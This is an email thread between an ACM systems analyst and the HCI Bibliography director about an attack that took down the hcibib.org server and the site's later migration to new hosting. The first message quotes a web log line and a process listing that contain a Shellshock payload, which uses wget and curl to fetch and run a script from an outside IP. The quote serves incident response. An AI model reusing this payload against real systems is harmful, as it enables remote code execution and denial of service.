 <CY1PR0501MB124146AD61549F83EA0C3FAC9FD90@CY1PR0501MB1241.namprd05.prod.outlook.com>
 <Pine.LNX.4.64.1505131024550.12137@turing.acm.org>
 <CY1PR0501MB1241BBE5DF5F9F680D707FA99FD90@CY1PR0501MB1241.namprd05.prod.outlook.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed

I set up domain forwarding of hcibib.org to another domain, mainly to alert me to the arrival of mail, but I think I'll be able to read hcibib.org mail with squirrel mail or some other client.

Thanks for your help. I'll be working on getting things working for the next few days.

Gary

On Wed, 13 May 2015, Adam Greenberg wrote:

> Ok. Let me know what you decide to do with hcibib.org
> If any DNS changes need to be done for the MX record of hcibib.org I can take care of that.
>
> Thanks
> Adam
>
> -----Original Message-----
> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
> Sent: Wednesday, May 13, 2015 10:31 AM
> To: Adam Greenberg
> Cc: Ken Bauer; ishelpdesk
> Subject: RE: hcibib.org website problem
>
> Thanks, Adam,
>
> I too have the same question about the email, but I don't have an answer.
>
> I'm quite familiar with the email options in cpanel. I think I can handle the mail forwarding for hcibib.org and will update my @acm.org address.
>
> Gary
>
> On Wed, 13 May 2015, Adam Greenberg wrote:
>
>> Gary,
>> I made the DNS changes for the website.
>>
>> One question, what would you like to do about the email?
>>
>> Do you have a gmail address you would like us to point the domain to?  And the mail for the @acm.org address that you have going to perlman@turing.acm.org?
>> You can use the email functionality within the Perlman.hosting.acm.org account.  It's configurable in cpanel.
>>
>> Let me know.
>>
>> Thanks
>> Adam
>>
>>
>> -----Original Message-----
>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>> Sent: Wednesday, May 13, 2015 9:32 AM
>> To: Adam Greenberg
>> Cc: Ken Bauer; ishelpdesk
>> Subject: RE: hcibib.org website problem
>>
>> I'm ready to go live. I still have some things to fix, but the core funcitonlaity is working.
>>
>> Gary
>>
>> On Mon, 11 May 2015, Adam Greenberg wrote:
>>
>>> Gary,
>>> I fixed the hosting for you.  If you look in cpanel under "Add On Domains"
>>> I added hcibib.org and mapped it with a document root of
>>> /public_html/hcibib/
>>>
>>> If you add this entry to your local hosts file
>>> 216.119.136.18 hcibib.org
>>> You can hit the site as hcibib.org without us modifying any DNS entries and opening it up right now.
>>>
>>> http://hcibib.org/index.html
>>>
>>> Once you think it's ready to go, let me know and I can change the DNS entries.
>>>
>>> We can leave the files in place on turing for now., that's not a problem.
>>>
>>> Thanks
>>> Adam
>>>
>>> -----Original Message-----
>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>> Sent: Monday, May 11, 2015 3:57 PM
>>> To: Adam Greenberg
>>> Cc: Ken Bauer; ishelpdesk
>>> Subject: RE: hcibib.org website problem
>>>
>>> I'm getting close. I've transferred a lot of files over to perlman.hosting.acm.org and have made good progress getting things working. I'd like to go live for just my IP:
>>> 	24.48.90.117
>>> and I'd like hcibib.org to point to:
>>> 	/home/perlman/www/hcibib
>>> I disabled some scripts I suspect of being vulnerable to a backdoor attack, and I'm going to rework any before I activate them again.
>>>
>>> I'd like a few days of testing before opening up hcibib.org from its new home.
>>> I'd prefer that my old files on turing stick around for a while while I make sure that I've gotten everything.
>>>
>>> Gary
>>>
>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>
>>>> Filezilla to Turing is either sftp or ftp server turing.acm.org
>>>> ports are standard 22 for sftp and 21 for ftp
>>>>
>>>>
>>>>
>>>> Thanks
>>>> Adam
>>>>
>>>>
>>>> -------- Original message --------
>>>> From: Gary PERLMAN <perlman@turing.acm.org>
>>>> Date: 05/09/2015 10:12 AM (GMT-05:00)
>>>> To: Adam Greenberg <greenberg@hq.acm.org>
>>>> Cc: Ken Bauer <kenbauer@acm.org>, ishelpdesk <ishelpdesk@hq.acm.org>
>>>> Subject: RE: hcibib.org website problem
>>>>
>>>> File transfer via SSH keeps failing. Do you know what parameters I need to connect to turing with FileZilla?
>>>>
>>>> Gary
>>>>
>>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>>
>>>>> Ok. Great.
>>>>> Let us know if you need any assistance.
>>>>>
>>>>> Thanks
>>>>> Adam
>>>>>
>>>>> -----Original Message-----
>>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>>> Sent: Saturday, May 09, 2015 9:59 AM
>>>>> To: Adam Greenberg
>>>>> Cc: Ken Bauer; ishelpdesk
>>>>> Subject: RE: hcibib.org website problem
>>>>>
>>>>> I am very sorry to have been unwittingly invovled in shutting down acm.org!
>>>>>
>>>>> I'm a little embarassed on this, but a move to a new hosting env has been "in the works" since at least last September, when I was given an acocunt (perlman.hosting.acm.org). At the time, I was overwhelmed by the task, but I think I can make progress.
>>>>>
>>>>> I will work on the file transfers today.
>>>>>
>>>>> Gary
>>>>>
>>>>> On Sat, 9 May 2015, Adam Greenberg wrote:
>>>>>
>>>>>> Ok.  What I would like to do then, is move you off of this old turing server and over to our newer hosting environment.
>>>>>> Ishelpdesk is copied on this, I'm asking for us to open a ticket to get Gary Perlman setup on the new server, and all the files from the hcibib.org website synced over to the new server.
>>>>>> Once Gary checks to make sure it works correctly we can cut DNS over.
>>>>>> There are more filters and controls in place on the new environment, that would help mitigate the issue should it happen again.
>>>>>> On the current server, this issue shut down this whole box, along with ACM's main website, because it tied up the resources of this server.
>>>>>>
>>>>>> Ishelpdesk, please proceed with getting an account setup for Gary, and setting it up to support the hcibib.org website.
>>>>>>
>>>>>> Thanks
>>>>>> Adam
>>>>>>
>>>>>> -----Original Message-----
>>>>>> From: Gary PERLMAN [mailto:perlman@turing.acm.org]
>>>>>> Sent: Friday, May 08, 2015 6:50 PM
>>>>>> To: Adam Greenberg
>>>>>> Cc: Ken Bauer; ishelpdesk
>>>>>> Subject: Re: hcibib.org website problem
>>>>>>
>>>>>> Well, I am stumped. I don't know what script was used for the attack, and if I did, I am not sure how I would prevent further attacks.
>>>>>>
>>>>>> Gary Perlman, Director, HCI Bibliography Project
>>>>>> mailto:director@hcibib.org  http://hcibib.org/
>>>>>>
>>>>>> On Wed, 6 May 2015, Adam Greenberg wrote:
>>>>>>
>>>>>>> Hello Gary,
>>>>>>> I had to take the hcibib.org website offline tonight.   The site was used to execute a denial of service attack that took down the server.
>>>>>>> Here is the reference from the hcibib.org weblogs
>>>>>>>
>>>>>>> 62.75.145.250 - - [06/May/2015:12:12:39 -0400] "GET / HTTP/1.1" 200 10740 "-" "() { :; }; /bin/bash -c 'rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1'"
>>>>>>>
>>>>>>> I put the entire weblog for today to your /home/Perlman
>>>>>>>
>>>>>>> The request executed a denial of service attack that started this.
>>>>>>> apache   28593     1  0 12:12 ?        00:00:00 /bin/bash -c rm -rf /tmp/dd.sh /tmp/dd1.sh;wget http://62.75.145.250/dd.sh -O /tmp/dd.sh;curl http://62.75.145.250/dd.sh -o /tmp/dd1.sh;sh /tmp/dd.sh & sh /tmp/dd1.sh 0>&1
>>>>>>>
>>>>>>> Attached is a sample of what was running on the server.
>>>>>>>
>>>>>>> I have changed the default document root of the website until I hear from you.  I would prefer to bring the site back online restricted to the IP address that you will be connecting from so that you have time to properly examine you site and then we can open it back up.  Please let me know the IP address you will be connecting from and I will make the appropriate configuration changes.
>>>>>>>
>>>>>>> Thanks
>>>>>>> Adam
>>>>>>>
>>>>>>>
>>>>>>> Adam Greenberg
>>>>>>> Senior Systems Analyst
>>>>>>> Association for Computing Machinery
>>>>>>> 2 Penn Plaza
>>>>>>> Suite 701
>>>>>>> New York, NY 10121
>>>>>>> Office: 212-626-0573
>>>>>>> greenberg@acm.org
>>>>>>>
>>>>>>>
>>>>>>
>>>>>>
>>>>>
>>>>>
>>>>
>>>> --
>>>>
>>>
>>>
>>
>>
>
>

-- 

